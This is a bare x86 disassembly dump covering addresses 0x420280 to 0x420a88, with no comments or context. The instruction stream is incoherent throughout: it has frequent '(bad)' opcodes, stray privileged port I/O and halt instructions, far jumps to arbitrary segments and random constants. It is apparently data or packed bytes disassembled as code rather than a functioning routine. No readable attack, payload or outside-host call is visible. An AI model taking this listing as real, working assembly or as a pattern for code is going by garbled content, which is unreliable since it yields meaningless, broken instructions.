  420280:	xchg   DWORD PTR [esi-0x1f],eax
  420283:	mov    dh,0x2a
  420285:	cmp    ch,dh
  420287:	xchg   edi,eax
  420288:	dec    edx
  420289:	add    BYTE PTR [eax-0x63d60112],bh
  42028f:	inc    edi
  420290:	inc    ebp
  420291:	xor    edi,ecx
  420293:	push   edi
  420294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420295:	int3   
  420296:	leave  
  420297:	ins    DWORD PTR es:[edi],dx
  420298:	jo     0x420314
  42029a:	jmp    0x9291:0xc52e0169
  4202a1:	add    dh,BYTE PTR [ebx-0x44]
  4202a4:	int    0x47
  4202a6:	fld    DWORD PTR [eax]
  4202a8:	shr    DWORD PTR [ebx],0xde
  4202ab:	sbb    eax,0x5fef0811
  4202b0:	push   ds
  4202b1:	adc    eax,0xd0199a17
  4202b6:	sub    BYTE PTR [ebp-0x185a9743],dl
  4202bc:	mov    al,0x76
  4202be:	gs or  al,0x4
  4202c1:	cli    
  4202c2:	pop    esp
  4202c3:	jp     0x420283
  4202c5:	add    BYTE PTR [edx],cl
  4202c7:	cmp    dh,BYTE PTR [edi]
  4202c9:	ss push es
  4202cb:	and    DWORD PTR [ebp+0x51c8b71e],eax
  4202d1:	xor    ebx,DWORD PTR [edi]
  4202d3:	rcr    BYTE PTR [ebx],1
  4202d5:	and    eax,0x7ebb1053
  4202da:	and    dl,al
  4202dc:	test   DWORD PTR [eax-0x4a6746da],esi
  4202e2:	cli    
  4202e3:	ja     0x420294
  4202e5:	mov    eax,0x2dab2f52
  4202ea:	jns    0x42032b
  4202ec:	cld    
  4202ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202ee:	pop    esi
  4202ef:	mov    eax,ds:0x9aa9c389
  4202f4:	mov    WORD PTR [edx-0x5d958627],?
  4202fa:	retf   
  4202fb:	aas    
  4202fc:	cmp    dl,BYTE PTR ds:0x8f36d4af
  420302:	pop    esp
  420303:	jle    0x420364
  420305:	mov    al,ds:0x666f28f9
  42030a:	add    eax,DWORD PTR [edx]
  42030c:	jge    0x4202ed
  42030e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42030f:	push   ss
  420310:	sub    DWORD PTR [eax+0x14],0x4641d8f
  420317:	xor    BYTE PTR [esi+0x7d],bl
  42031a:	push   es
  42031b:	jae    0x4202a7
  42031d:	popf   
  42031e:	fcmovne st,st(7)
  420320:	mov    al,0x1d
  420322:	sbb    al,0xba
  420324:	push   esi
  420325:	fisttp DWORD PTR [edi-0x127d7f95]
  42032b:	pop    es
  42032c:	pop    edx
  42032d:	and    esi,DWORD PTR [ebx]
  42032f:	cmp    ebp,DWORD PTR [ecx-0x11]
  420332:	inc    esp
  420333:	in     eax,0xcc
  420335:	int3   
  420336:	sbb    BYTE PTR [edi-0x41],dl
  420339:	lods   al,BYTE PTR ds:[esi]
  42033a:	dec    ebp
  42033b:	popf   
  42033c:	es in  eax,dx
  42033e:	sub    eax,0x86d1836e
  420343:	shr    DWORD PTR [esp+eiz*8],cl
  420346:	aaa    
  420347:	sub    al,0x34
  420349:	sar    BYTE PTR ds:0xe6d52822,1
  42034f:	sub    ecx,DWORD PTR [esi-0x65f9aada]
  420355:	ret    0x29eb
  420358:	xor    bh,bl
  42035a:	bound  esi,QWORD PTR [eax+0x301c5226]
  420360:	sbb    eax,0xfbc9479a
  420365:	(bad)  
  420366:	shl    BYTE PTR [edi+0x2e],1
  420369:	shl    BYTE PTR [esi+0x3d4637e2],1
  42036f:	(bad)  
  420370:	jmp    0xa28d:0xc0d8b93
  420377:	jnp    0x42030a
  420379:	addr16 jp 0x4203b6
  42037c:	test   DWORD PTR [edi-0x74bbfcd2],0xe2277968
  420386:	iret   
  420387:	loope  0x4203bf
  420389:	adc    eax,0xbcbfb5f
  42038e:	add    bh,dh
  420390:	xchg   ecx,eax
  420391:	mov    DWORD PTR [ecx-0x3a],0xc2d65e50
  420398:	pop    edi
  420399:	inc    esi
  42039a:	lods   al,BYTE PTR ds:[esi]
  42039b:	sub    al,BYTE PTR [esi+0x6082b7bf]
  4203a1:	cmp    DWORD PTR [edx-0x4bbe5372],eax
  4203a7:	leave  
  4203a8:	addr16 (bad) 
  4203aa:	pop    ss
  4203ab:	dec    ebp
  4203ac:	ja     0x42034d
  4203ae:	fimul  DWORD PTR [esi+0x7df7f432]
  4203b4:	mov    al,BYTE PTR [edi+0x37]
  4203b7:	je     0x420354
  4203b9:	add    dl,BYTE PTR [ecx]
  4203bb:	jbe    0x420365
  4203bd:	mov    dh,0xc9
  4203bf:	lods   al,BYTE PTR ds:[esi]
  4203c0:	sbb    eax,0x203750f
  4203c5:	stos   DWORD PTR es:[edi],eax
  4203c6:	mov    dh,dl
  4203c8:	and    bh,bh
  4203ca:	ror    BYTE PTR [ebx],1
  4203cc:	mulps  xmm1,XMMWORD PTR [ecx-0x3]
  4203d0:	mov    edi,0x11a1549f
  4203d5:	pop    esi
  4203d6:	mov    esp,0x64c3c2ca
  4203db:	js     0x4203b8
  4203dd:	pop    esi
  4203de:	mov    WORD PTR [esp+eax*1-0x31222fff],cs
  4203e5:	mov    ecx,0xe6f9a475
  4203ea:	jmp    0xef58:0x6d0c450a
  4203f1:	ds mov dh,0xdc
  4203f4:	xchg   ebp,eax
  4203f5:	dec    ecx
  4203f6:	jmp    0xea480a51
  4203fb:	addr16 loope 0x4203c9
  4203fe:	or     DWORD PTR [esi+0x6b3f3aea],esi
  420404:	hlt    
  420405:	test   al,0x90
  420407:	repz cld 
  420409:	fsub   DWORD PTR [ebx]
  42040b:	cld    
  42040c:	add    eax,0x182427db
  420411:	test   al,0xb3
  420413:	fiadd  DWORD PTR ds:0x31bb87f1
  420419:	cmp    DWORD PTR [eax-0x70],esi
  42041c:	ins    DWORD PTR es:[edi],dx
  42041d:	sub    al,dl
  42041f:	pusha  
  420420:	add    al,BYTE PTR [ebx]
  420422:	or     BYTE PTR [ecx-0x6bd3a0d5],dl
  420428:	sbb    al,0x1d
  42042a:	rol    cl,cl
  42042c:	add    bh,BYTE PTR [eax]
  42042e:	mov    esi,0x2c5a9203
  420433:	lods   eax,DWORD PTR ds:[esi]
  420434:	sub    BYTE PTR [edx],bl
  420436:	(bad)  
  420437:	xchg   ebx,eax
  420439:	icebp  
  42043a:	iret   
  42043b:	xchg   esi,eax
  42043c:	std    
  42043d:	(bad)  
  42043e:	or     esp,DWORD PTR [eax+0x722c5b46]
  420444:	clc    
  420445:	mov    al,0xe5
  420447:	jl     0x4203e6
  420449:	xlat   BYTE PTR ds:[ebx]
  42044a:	cmp    BYTE PTR [ebp+ebp*2+0x6],cl
  42044e:	sub    ebp,DWORD PTR [ebx-0x761908ef]
  420454:	fldenv [edx]
  420456:	iret   
  420457:	jle    0x4203ee
  420459:	adc    BYTE PTR [edx+ebp*1+0x2e],cl
  42045d:	mov    ebp,0x8616350b
  420462:	clc    
  420463:	or     edi,edx
  420465:	add    al,0x9f
  420467:	push   ecx
  420468:	call   DWORD PTR [ebx+0x2b66f03]
  42046e:	xchg   edi,eax
  42046f:	lea    edx,[edx-0xc]
  420472:	push   ebx
  420473:	aaa    
  420474:	cmp    BYTE PTR [edx+0x4174669f],cl
  42047a:	stos   DWORD PTR es:[edi],eax
  42047b:	cmc    
  42047c:	xchg   ebx,eax
  42047d:	adc    eax,0x13b70496
  420482:	jae    0x420410
  420484:	mov    eax,ds:0x838d647f
  420489:	fcomp  DWORD PTR [ebx-0x45]
  42048c:	into   
  42048d:	scas   al,BYTE PTR es:[edi]
  42048e:	cld    
  42048f:	and    esp,esi
  420491:	or     esp,edx
  420493:	mov    edi,0xfd1c11b9
  420498:	add    DWORD PTR [ecx+esi*1],esi
  42049b:	jne    0x420425
  42049d:	outs   dx,BYTE PTR ds:[esi]
  42049e:	(bad)  
  42049f:	cmp    ebp,DWORD PTR [eax-0x1c283f1e]
  4204a5:	mov    BYTE PTR [edi+0x16],bh
  4204a8:	sub    al,0x5a
  4204aa:	dec    esp
  4204ab:	inc    ecx
  4204ac:	sbb    eax,0x96776d46
  4204b1:	sbb    DWORD PTR [ebp+0x2e],edx
  4204b4:	stos   DWORD PTR es:[edi],eax
  4204b5:	sub    al,0x9f
  4204b7:	arpl   WORD PTR [esi-0x41],bx
  4204ba:	call   0xb53b7b76
  4204bf:	mov    cs,edx
  4204c1:	in     al,0x43
  4204c3:	ficom  DWORD PTR [esi+0x7438da1b]
  4204c9:	push   ecx
  4204ca:	bound  ecx,QWORD PTR [esi+0x61]
  4204cd:	imul   ecx,DWORD PTR [esi+ebx*4+0x90a53d],0xffffffd8
  4204d5:	inc    eax
  4204d6:	jne    0x420477
  4204d8:	lds    esp,FWORD PTR [eax+0x6f]
  4204db:	rcl    dh,cl
  4204dd:	cmc    
  4204de:	stos   BYTE PTR es:[edi],al
  4204df:	mov    eax,0x2457bf33
  4204e4:	add    DWORD PTR [ebx+0x6eb7549f],ebx
  4204ea:	ret    
  4204eb:	scas   eax,DWORD PTR es:[edi]
  4204ec:	les    eax,FWORD PTR cs:[edx+esi*8-0x41ea184b]
  4204f4:	and    al,0xa4
  4204f6:	or     eax,0x7bc3522
  4204fb:	sbb    eax,0x6dcf4bf3
  420500:	xchg   DWORD PTR [ecx+0x2b],esp
  420503:	mov    WORD PTR [ecx+0x7c],cs
  420506:	or     al,0x55
  420508:	xor    dl,BYTE PTR [eax+eax*1+0x21]
  42050c:	push   cs
  42050d:	js     0x420548
  42050f:	xchg   edi,eax
  420510:	xlat   BYTE PTR ds:[ebx]
  420511:	test   BYTE PTR [edx],bl
  420513:	hlt    
  420514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420515:	hlt    
  420516:	fs loope 0x420520
  420519:	aaa    
  42051a:	pop    ds
  42051b:	ja     0x420516
  42051d:	xlat   BYTE PTR ds:[ebx]
  42051e:	call   0xf8f7ff75
  420523:	sbb    DWORD PTR ds:0x6d91bd55,edx
  420529:	jl     0x420580
  42052b:	jmp    0xe01b4311
  420530:	sub    edi,DWORD PTR [eax+0x4e]
  420533:	int3   
  420534:	adc    DWORD PTR [edi+0x4d],0x27
  420538:	aas    
  420539:	add    ch,bh
  42053b:	pop    edi
  42053c:	repnz cdq 
  42053e:	push   0xffffffd9
  420540:	adc    al,0xe8
  420542:	mov    al,0x4b
  420544:	in     eax,dx
  420545:	ret    0xd155
  420548:	add    eax,0x284f7f67
  42054d:	fidiv  DWORD PTR [ebp+0x22]
  420550:	adc    al,0xde
  420552:	mov    DWORD PTR [edi+0x1c],eax
  420555:	fwait
  420556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420557:	push   0xd
  420559:	pop    edx
  42055a:	je     0x420576
  42055c:	outs   dx,DWORD PTR es:[esi]
  42055e:	cdq    
  42055f:	stc    
  420560:	inc    ebx
  420561:	push   eax
  420562:	jmp    0x420550
  420564:	jo     0x4205d6
  420566:	push   esi
  420567:	adc    BYTE PTR [ecx],ah
  420569:	xor    al,0x93
  42056b:	pop    ecx
  42056c:	mov    ah,BYTE PTR [ebp+edx*4-0xa]
  420570:	cld    
  420571:	sub    al,0x59
  420573:	js     0x420508
  420575:	pop    esp
  420576:	sbb    al,0xc4
  420578:	out    0xae,eax
  42057a:	pop    ebx
  42057b:	mov    ds:0x9e61ce22,al
  420580:	clc    
  420581:	sbb    DWORD PTR [ebx-0x26fdd8ba],edi
  420587:	and    cl,dh
  420589:	cmp    BYTE PTR [eax],al
  42058b:	pop    ecx
  42058c:	inc    esi
  42058d:	mov    ebp,DWORD PTR [edi+0x6c6402b0]
  420593:	das    
  420594:	stos   BYTE PTR es:[edi],al
  420595:	push   ebp
  420596:	js     0x4205bc
  420598:	pop    ds
  420599:	sbb    eax,0x49828ba2
  42059e:	leave  
  42059f:	sbb    eax,0x8012a239
  4205a4:	dec    ebx
  4205a5:	cmp    edi,DWORD PTR [eax+0x2d18b1c]
  4205ab:	jle    0x420587
  4205ad:	loop   0x4205ea
  4205af:	nop
  4205b0:	pop    ebx
  4205b1:	lea    ebp,[eax+0x24f59fa9]
  4205b7:	lds    edx,FWORD PTR [ecx]
  4205b9:	or     eax,0xe2c90ca1
  4205be:	ins    BYTE PTR es:[edi],dx
  4205bf:	out    0x27,al
  4205c1:	mov    ds:0xbdb7c127,al
  4205c6:	std    
  4205c7:	sbb    BYTE PTR ds:0x150dd861,0x9c
  4205ce:	fcomp  DWORD PTR [ebp-0x3563f083]
  4205d4:	test   eax,0x635082ed
  4205d9:	(bad)  [esi-0x60]
  4205dc:	mov    cl,0x40
  4205de:	mov    BYTE PTR [esi],ah
  4205e0:	icebp  
  4205e1:	mov    edi,eax
  4205e3:	call   0xa0e9fca
  4205e8:	xchg   ecx,eax
  4205e9:	mov    bl,ah
  4205eb:	adc    DWORD PTR [eax*1-0x59f12683],0xffffffc6
  4205f3:	inc    ecx
  4205f4:	pop    eax
  4205f5:	jmp    0x4420:0xeab70b5e
  4205fc:	and    bl,cl
  4205fe:	ds inc edx
  420600:	or     DWORD PTR [ebx],esp
  420602:	and    al,0xa3
  420604:	fwait
  420605:	dec    eax
  420606:	mov    eax,0xe9ed24cb
  42060b:	mov    eax,ds:0xcf211d95
  420610:	xor    DWORD PTR [esi+0x48],eax
  420613:	outs   dx,BYTE PTR ds:[esi]
  420614:	and    edx,edx
  420616:	std    
  420617:	sbb    edx,DWORD PTR [esi+0x60a2bc49]
  42061d:	(bad)  
  42061e:	rcl    BYTE PTR [ecx-0x288ab126],cl
  420624:	or     DWORD PTR [edx-0x7fff3ef9],ebp
  42062a:	loope  0x420666
  42062c:	mov    dh,0x2d
  42062e:	test   DWORD PTR [eax],0x6e02d8a3
  420634:	retf   0x8557
  420637:	cmp    al,0x22
  420639:	pushf  
  42063a:	inc    esi
  42063b:	lock and DWORD PTR [ebp+0x23],edi
  42063f:	xor    BYTE PTR [edi-0x317e5539],0x21
  420646:	jmp    0x6cef1894
  42064b:	dec    edi
  42064c:	xchg   edi,eax
  42064d:	dec    eax
  42064e:	add    esp,0xe33295d6
  420654:	mov    ds:0xf79cdcc7,eax
  420659:	mov    bh,0x35
  42065b:	jno    0x42061a
  42065d:	xchg   edi,eax
  42065e:	outs   dx,DWORD PTR ds:[esi]
  42065f:	(bad)  
  420660:	mov    dh,0x6c
  420662:	les    ebp,FWORD PTR [ebx+0x58906b4d]
  420668:	mov    ah,0x48
  42066a:	test   eax,0x60fa4ddc
  42066f:	xlat   BYTE PTR ds:[ebx]
  420670:	std    
  420671:	stos   DWORD PTR es:[edi],eax
  420672:	adc    al,0xda
  420674:	adc    ch,bh
  420676:	pop    edi
  420677:	test   DWORD PTR [eax-0x18],0x66f99b7
  42067e:	das    
  42067f:	cs pop es
  420681:	add    ebp,ebx
  420683:	jno    0x420632
  420685:	mov    esi,0xfe53eb44
  42068a:	push   0x448408a5
  42068f:	mov    ah,BYTE PTR [ecx+0x21c70a28]
  420695:	popa   
  420696:	mov    ds:0x6573502f,al
  42069b:	int3   
  42069c:	std    
  42069d:	fcom   QWORD PTR [eax-0x3262597b]
  4206a3:	mul    al
  4206a5:	mov    bh,0x74
  4206a7:	pusha  
  4206a8:	loopne 0x420683
  4206aa:	adc    BYTE PTR [ebx+eiz*4],dh
  4206ad:	xchg   edx,eax
  4206ae:	outs   dx,BYTE PTR ss:[esi]
  4206b0:	hlt    
  4206b1:	out    0x56,al
  4206b3:	mov    ch,0x3a
  4206b5:	cld    
  4206b6:	in     eax,0xfd
  4206b8:	xchg   edi,eax
  4206ba:	dec    edx
  4206bb:	jp     0x42068a
  4206bd:	loope  0x420692
  4206bf:	test   al,0xb0
  4206c1:	or     al,0xf7
  4206c3:	aam    0x62
  4206c5:	adc    al,BYTE PTR [edx]
  4206c7:	add    ebx,DWORD PTR [edx-0x2e]
  4206ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206cb:	cmp    edi,DWORD PTR [ecx]
  4206cd:	dec    eax
  4206ce:	test   ecx,0x55873fc7
  4206d4:	inc    ecx
  4206d5:	fwait
  4206d6:	cwde   
  4206d7:	adc    dh,BYTE PTR ss:[ebp+ebp*8+0x4ce3710]
  4206df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206e0:	xchg   esp,eax
  4206e1:	fiadd  WORD PTR ds:0x71a466b3
  4206e7:	mov    bh,0xa2
  4206e9:	cmp    eax,0x446346a6
  4206ee:	cs je  0x4206eb
  4206f1:	cs (bad) 
  4206f3:	jle    0x420729
  4206f5:	sub    ch,BYTE PTR [ebx-0x39]
  4206f8:	push   ss
  4206f9:	cmp    eax,0x67550703
  4206fe:	and    dl,bl
  420700:	inc    ecx
  420701:	fbstp  TBYTE PTR [eax+0x5d712f2e]
  420707:	out    dx,al
  420708:	fisub  DWORD PTR [edi-0x4138554c]
  42070e:	push   esi
  42070f:	scas   eax,DWORD PTR es:[edi]
  420710:	rcl    BYTE PTR [edx+0x35e1741c],1
  420716:	adc    eax,0x87141158
  42071b:	xor    eax,DWORD PTR [edx]
  42071d:	lea    edx,[ebx+0x14c42f6b]
  420723:	jae    0x4206b0
  420725:	es dec ecx
  420727:	adc    DWORD PTR [ebx+ebx*8+0x4891d7c6],ebx
  42072e:	imul   edi,DWORD PTR [esi+0x2dcac788],0xffffffed
  420735:	adc    esp,DWORD PTR [ecx+0x13]
  420738:	jno    0x4206da
  42073a:	push   edx
  42073b:	aam    0x8c
  42073d:	dec    eax
  42073e:	data16 (bad) 
  420740:	hlt    
  420741:	sbb    eax,0xa8808e07
  420746:	mov    eax,cs
  420748:	push   0xffffffc8
  42074a:	push   ds
  42074b:	push   eax
  42074c:	add    BYTE PTR [ecx],0xe
  42074f:	pop    eax
  420750:	sbb    DWORD PTR [ecx],ebx
  420752:	xor    BYTE PTR [esi-0x39],dh
  420755:	inc    ebx
  420756:	sbb    al,0x80
  420758:	mov    es,ebp
  42075a:	scas   al,BYTE PTR es:[edi]
  42075b:	ds mov bl,0xb4
  42075e:	and    bh,cl
  420760:	ins    DWORD PTR es:[edi],dx
  420761:	ror    BYTE PTR [esi*1+0x2079d07f],1
  420768:	(bad)  
  420769:	push   ss
  42076a:	pop    edx
  42076b:	mov    ds:0xfa2fa9aa,al
  420770:	bound  edi,QWORD PTR [ecx-0xf]
  420773:	sbb    DWORD PTR [eax+0x494b6e44],edi
  420779:	add    DWORD PTR [ebp+0x4b7120f8],ebx
  42077f:	lods   eax,DWORD PTR ds:[esi]
  420780:	xor    ah,cl
  420782:	call   0x5cb1d62b
  420787:	mov    esi,0xd517d8c0
  42078c:	int3   
  42078d:	fwait
  42078e:	mov    cl,0x5d
  420790:	xor    ebp,0xffffffd6
  420793:	out    dx,eax
  420794:	push   esp
  420795:	(bad)  [ebp-0x4c5d22d3]
  42079b:	add    bl,BYTE PTR [ebx-0x3d20bf02]
  4207a1:	sub    ebx,DWORD PTR [esi+0x3f]
  4207a4:	std    
  4207a5:	cdq    
  4207a6:	push   ebp
  4207a7:	or     al,0x1c
  4207a9:	mov    bl,0x66
  4207ab:	fistp  WORD PTR [edx+0x10]
  4207ae:	push   0xfffffff7
  4207b0:	popa   
  4207b1:	rcr    bl,cl
  4207b3:	stos   BYTE PTR es:[edi],al
  4207b4:	push   eax
  4207b5:	inc    esi
  4207b6:	mov    al,ds:0x89b097fa
  4207bb:	adc    esi,0x2d
  4207be:	jbe    0x4207a0
  4207c0:	inc    esi
  4207c1:	push   edx
  4207c2:	mov    edi,0xf7abedda
  4207c7:	shl    BYTE PTR [edi+0x38],0xea
  4207cb:	ror    esi,0xb1
  4207ce:	add    dl,dl
  4207d0:	int    0x5e
  4207d2:	aas    
  4207d3:	(bad)  
  4207d4:	dec    ecx
  4207d5:	retf   0xaa2
  4207d8:	fsubr  DWORD PTR [eax]
  4207da:	nop
  4207db:	push   edi
  4207dc:	in     al,0x8f
  4207de:	pop    ecx
  4207df:	and    eax,0x23fbb429
  4207e4:	xor    al,0x6d
  4207e6:	jmp    0x560518fc
  4207eb:	imul   eax,DWORD PTR [ebp+0x832e69a],0xffffffc0
  4207f2:	test   al,0xe
  4207f4:	mov    edx,0x7b67fdb7
  4207f9:	push   ecx
  4207fa:	aaa    
  4207fb:	jl     0x4207e7
  4207fd:	mov    al,0xac
  4207ff:	pop    edi
  420800:	mov    edx,0xdc8b2e8b
  420805:	or     ch,bl
  420807:	popf   
  420808:	add    DWORD PTR [edx],eax
  42080a:	pop    eax
  42080b:	lahf   
  42080c:	jbe    0x42084f
  42080e:	jg     0x420826
  420810:	imul   ebx,DWORD PTR [ebp+0x1e],0xfffffff6
  420814:	pop    es
  420815:	ins    BYTE PTR es:[edi],dx
  420816:	out    dx,eax
  420817:	leave  
  420818:	xor    BYTE PTR [edx-0x509eba7e],ah
  42081e:	test   BYTE PTR [edi-0x6d59451d],bl
  420824:	pop    es
  420825:	jmp    0x42081e
  420827:	lods   eax,DWORD PTR ds:[esi]
  420828:	dec    edi
  420829:	jmp    0x9fb7:0xaa202ebd
  420830:	sbb    eax,ebx
  420832:	push   0xd815e570
  420837:	jbe    0x4207fa
  420839:	mov    ds:0xae41ab8c,al
  42083e:	popf   
  42083f:	mov    al,ah
  420841:	or     eax,0x40e0fc6a
  420846:	xchg   ebp,eax
  420847:	stc    
  420848:	jle    0x42087d
  42084a:	cwde   
  42084b:	mov    edi,0xf7feb3c4
  420850:	repz add BYTE PTR [esi-0x4b],cl
  420854:	pop    eax
  420855:	and    DWORD PTR ds:0xf6f22414,edx
  42085b:	sahf   
  42085c:	pop    ebp
  42085d:	in     eax,0xf4
  42085f:	int    0xb5
  420861:	les    ebp,FWORD PTR [esi]
  420863:	cmp    eax,0x3f8976ac
  420868:	enter  0x7cb4,0x73
  42086c:	out    dx,eax
  42086d:	mov    al,0xaf
  42086f:	inc    ebx
  420870:	in     al,0x74
  420872:	sbb    eax,0x8104e014
  420877:	pop    ebx
  420878:	out    dx,al
  420879:	xor    eax,0xd6704069
  42087e:	stos   DWORD PTR es:[edi],eax
  42087f:	dec    ebp
  420880:	les    edx,FWORD PTR [edx+0x4b26e4f4]
  420886:	pop    es
  420887:	retf   0x682
  42088a:	jb     0x42086d
  42088c:	push   es
  42088d:	into   
  42088e:	and    DWORD PTR [ebx-0x4b],0xffffffb8
  420892:	xor    eax,0xa55cabd8
  420897:	inc    eax
  420898:	dec    BYTE PTR [ebp-0x26034b29]
  42089e:	adc    BYTE PTR [ebx-0x4a16cc59],ch
  4208a4:	cmp    ah,dh
  4208a6:	nop
  4208a7:	leave  
  4208a8:	or     DWORD PTR [eax],eax
  4208aa:	or     edi,DWORD PTR [ebp+edi*4-0x10]
  4208ae:	int    0xe4
  4208b0:	outs   dx,DWORD PTR ds:[esi]
  4208b1:	shl    DWORD PTR [ecx-0x10],1
  4208b4:	dec    ecx
  4208b5:	fisttp QWORD PTR [ecx]
  4208b7:	push   ebx
  4208b8:	dec    esi
  4208b9:	test   BYTE PTR [edx],ch
  4208bb:	shl    ah,1
  4208bd:	jnp    0x420918
  4208bf:	or     al,0xd3
  4208c1:	lods   eax,DWORD PTR ds:[esi]
  4208c2:	or     BYTE PTR [eax-0x5b],0xa6
  4208c6:	pop    ds
  4208c7:	call   0x6af0:0xdef1a9ba
  4208ce:	inc    edx
  4208cf:	lock add BYTE PTR ds:0x9dc7596b,al
  4208d6:	cld    
  4208d7:	daa    
  4208d8:	push   ebx
  4208d9:	pop    eax
  4208da:	and    eax,0xd9e1f500
  4208df:	pop    ds
  4208e0:	mov    eax,0x4dbaaeea
  4208e5:	push   es
  4208e6:	mov    ebp,0x9f611919
  4208eb:	push   ebx
  4208ec:	leave  
  4208ed:	xor    ah,ah
  4208ef:	fdecstp 
  4208f1:	cmp    al,0xee
  4208f3:	push   esi
  4208f4:	sub    BYTE PTR [ecx+0x1352fd1],ch
  4208fa:	jcxz   0x420882
  4208fd:	out    dx,eax
  4208fe:	ss mov dl,0xd1
  420901:	(bad)  
  420902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420903:	int    0xa2
  420905:	mov    cl,0x8e
  420907:	hlt    
  420908:	retf   
  420909:	xchg   edi,eax
  42090a:	cdq    
  42090b:	movsx  ebx,BYTE PTR [ebx]
  42090e:	imul   eax,esp,0x3b7cb1bc
  420914:	xor    ebx,DWORD PTR [ecx]
  420916:	mov    bl,0x4c
  420918:	cmp    ah,BYTE PTR [esi-0x5a474b88]
  42091e:	cmp    BYTE PTR [ebx],dh
  420920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420921:	mov    edi,0x58b0f42d
  420926:	push   cs
  420927:	loope  0x4208f2
  420929:	sub    ebx,DWORD PTR [eax]
  42092b:	inc    ecx
  42092c:	or     dl,bh
  42092e:	rcr    DWORD PTR [ebp+0xa221337],1
  420934:	mov    DWORD PTR [bp+0x4ced],ecx
  420939:	jmp    0x4202d31b
  42093e:	outs   dx,BYTE PTR ds:[esi]
  42093f:	adc    BYTE PTR [edx-0x642c8faf],0x16
  420946:	xchg   BYTE PTR [bx+di],ah
  420949:	add    bl,bl
  42094b:	les    eax,FWORD PTR [edx-0x6efa3ef5]
  420951:	push   ecx
  420952:	xchg   ecx,eax
  420953:	xchg   edi,eax
  420954:	enter  0x29c8,0x40
  420958:	ret    
  420959:	cld    
  42095a:	push   ss
  42095b:	pop    ebp
  42095c:	cmp    ecx,edx
  42095e:	jno    0x4208e7
  420960:	inc    ebx
  420961:	(bad)  
  420963:	nop    DWORD PTR [ecx-0x56]
  420967:	push   ecx
  420968:	adc    dl,BYTE PTR [eax+edx*2+0x28c196e3]
  42096f:	or     eax,0x7a4654a8
  420974:	std    
  420975:	js     0x4209d7
  420977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420978:	pop    eax
  420979:	fcomp  QWORD PTR [esi-0x312a1f3f]
  42097f:	xor    al,0x53
  420981:	xchg   DWORD PTR ds:0x56df71b4,esp
  420987:	call   0xae4e577c
  42098c:	sti    
  42098d:	ss int 0x35
  420990:	sar    DWORD PTR [ebp+0x2f0bac6c],0xc0
  420997:	jne    0x4209af
  420999:	push   ds
  42099a:	aad    0x75
  42099c:	lods   al,BYTE PTR ds:[esi]
  42099d:	in     al,dx
  42099e:	adc    eax,DWORD PTR [edi-0x69]
  4209a1:	pop    ebx
  4209a2:	sar    DWORD PTR [edx],1
  4209a4:	add    ecx,ebx
  4209a6:	mov    esp,0x402dbad6
  4209ab:	stc    
  4209ac:	inc    eax
  4209ad:	fisttp WORD PTR cs:[eax+edi*1]
  4209b1:	adc    ah,ah
  4209b3:	add    DWORD PTR [eax+0x785aff5a],0x31
  4209ba:	jmp    0x42095d
  4209bc:	icebp  
  4209bd:	xlat   BYTE PTR ds:[ebx]
  4209be:	mov    ch,0xa
  4209c0:	xor    BYTE PTR ds:0x3fbdbef4,ch
  4209c6:	pusha  
  4209c7:	mov    bh,cl
  4209c9:	call   FWORD PTR [edi]
  4209cb:	mov    ebp,0x994e45db
  4209d0:	xor    al,0x4a
  4209d2:	pop    esp
  4209d3:	cmp    BYTE PTR [esi],bh
  4209d5:	or     eax,0x908a1429
  4209da:	loopne 0x42095f
  4209dc:	inc    eax
  4209dd:	push   0xffffff86
  4209df:	scas   al,BYTE PTR es:[edi]
  4209e0:	and    BYTE PTR [eax],0x2a
  4209e3:	push   edx
  4209e4:	addr16 (bad) 
  4209e6:	sbb    BYTE PTR [eax+0xf172c81],dl
  4209ec:	shr    DWORD PTR [edi+0x350e3d41],1
  4209f2:	inc    ebp
  4209f3:	rol    DWORD PTR [ebx+0x1facf85],0x57
  4209fa:	into   
  4209fb:	push   esi
  4209fc:	lds    esp,FWORD PTR [ebx+0x52538b9f]
  420a02:	scas   eax,DWORD PTR es:[edi]
  420a03:	fs pop ebx
  420a05:	push   ss
  420a06:	or     esi,DWORD PTR [ecx-0x6e]
  420a09:	push   esp
  420a0a:	loopne 0x420a69
  420a0c:	push   esp
  420a0d:	xchg   ecx,eax
  420a0e:	pop    eax
  420a0f:	ror    BYTE PTR [eax+0x2c],0xcf
  420a13:	into   
  420a14:	add    BYTE PTR [ebx],dl
  420a16:	adc    bl,BYTE PTR [ebx-0x23]
  420a19:	or     al,0x62
  420a1b:	or     dh,BYTE PTR [ecx]
  420a1d:	ficomp DWORD PTR [edx-0x117945f]
  420a23:	cmp    dh,BYTE PTR [edi]
  420a25:	add    eax,0x5b7f9b33
  420a2a:	pop    DWORD PTR [ecx-0x62]
  420a2d:	sbb    bh,0xb7
  420a30:	jnp    0x4209d5
  420a32:	ja     0x420a86
  420a34:	inc    ecx
  420a35:	popf   
  420a36:	jmp    0x76399377
  420a3b:	and    ch,BYTE PTR [ecx-0x60dcd04a]
  420a41:	icebp  
  420a42:	daa    
  420a43:	dec    eax
  420a44:	push   0xf64e6061
  420a49:	(bad)  [edx+0x4bfe020a]
  420a4f:	mov    al,0xe2
  420a51:	sub    DWORD PTR [esi],edi
  420a53:	ret    
  420a54:	mov    ds:0xd1390685,al
  420a59:	out    dx,al
  420a5a:	adc    DWORD PTR [ecx+ecx*1+0x72],edx
  420a5e:	clc    
  420a5f:	jno    0x420a9f
  420a61:	jno    0x420a4c
  420a63:	bound  ebp,QWORD PTR [edi]
  420a65:	push   ecx
  420a66:	(bad)  
  420a67:	enter  0x4502,0xd1
  420a6b:	(bad)  
  420a6c:	cli    
  420a6d:	jnp    0x420a8d
  420a6f:	push   edi
  420a70:	cmp    ah,0xb1
  420a73:	out    dx,eax
  420a74:	push   edx
  420a75:	or     ah,BYTE PTR [ebp+0x2344350a]
  420a7b:	retf   0xd93b
  420a7e:	fimul  WORD PTR [edx]
  420a81:	ds ds pop eax
  420a84:	push   edx
  420a85:	or     edx,DWORD PTR [edi-0x40]
  420a88:	call   0xd47a2b15
